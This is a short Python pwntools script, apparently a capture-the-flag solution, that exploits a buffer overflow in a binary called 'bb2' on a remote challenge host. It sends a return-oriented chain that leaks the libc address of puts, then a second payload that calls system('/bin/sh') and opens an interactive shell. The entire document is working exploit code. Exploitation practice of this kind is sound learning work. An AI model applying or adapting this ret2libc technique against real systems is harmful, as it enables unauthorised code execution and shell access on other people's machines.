from pwn import *

e = ELF("./bb2")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("host1.metaproblems.com", 5152)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

prdi = 0x000000000040133b

p.sendlineafter("copy", "/bin/sh".ljust(0x38, "\x00") + p64(prdi) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + p64(e.symbols["main"]))
p.sendlineafter("target", "/tmp/a")

p.recvuntil("fully.")
p.recvline()
leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]
print(hex(leak))

p.sendlineafter("copy", "/bin/sh".ljust(0x38, "\x00") + p64(prdi) + p64(leak + next(libc.search("/bin/sh"))) + p64(leak + libc.symbols["system"]))
p.sendlineafter("target", "/tmp/a")


p.interactive()
